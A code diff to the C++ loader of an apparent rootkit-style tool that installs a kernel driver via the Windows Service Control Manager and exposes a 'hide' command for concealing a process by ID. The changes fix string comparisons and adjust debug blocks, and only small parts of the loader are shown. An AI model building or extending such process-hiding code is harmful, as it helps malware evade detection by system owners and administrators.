@@ -27,7 +27,6 @@ bool hideProcess(char* driverName, int pid);
 #define SCM_LOAD
 #endif
 
-#define DEBUG
 #ifdef TRY_LOAD
 #define loadSysFile tryLoadSysFile
 #elif defined SCM_LOAD
@@ -44,7 +43,7 @@ int main(int argc, char *argv[])
 	Logs::log = new Log();
 	Logs::log->WriteLine("\n\nstarted...\n");
 #endif
-	if (argc < 2 || argv[1] == "hide" && argc < 3)
+	if (argc < 2 || !strcmp(argv[1], "hide") && argc < 3)
 	{
 #ifdef DEBUG
 		printf("Not enougth arguments");
@@ -63,8 +62,8 @@ int main(int argc, char *argv[])
 	system(buff);
 #endif
 #if defined SCM_LOAD || defined TRY_LOAD
-	if (strcmp(argv[1], "load") && loadSysFile(driverName, displayName, serviceName) || // if need to load
-		strcmp(argv[1], "hide") && hideProcess(displayName, atoi(argv[2]) /* atoi = (char[]) argument to integer */ )) // if need to hide 
+	if (!strcmp(argv[1], "load") && loadSysFile(driverName, displayName, serviceName) || // if need to load (!strcmp = equals)
+		!strcmp(argv[1], "hide") && hideProcess(displayName, atoi(argv[2]) /* atoi = (char[]) argument to integer */ )) // if need to hide 
 #ifdef DEBUG
 		printf("success");
 #else
@@ -92,8 +91,8 @@ bool loadSysFileSCM(char* driverName, char* displayName, char* serviceName) // l
 #ifdef DEBUG
 	printf("loading via SCM\n");
 	Logs::log->WriteLine("loading via SCM");
-#endif
 	char* frmtStr = new char[1024];
+#endif
 	// Open a handle to the SCM
 	SC_HANDLE scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
 	if (!scmHandle)
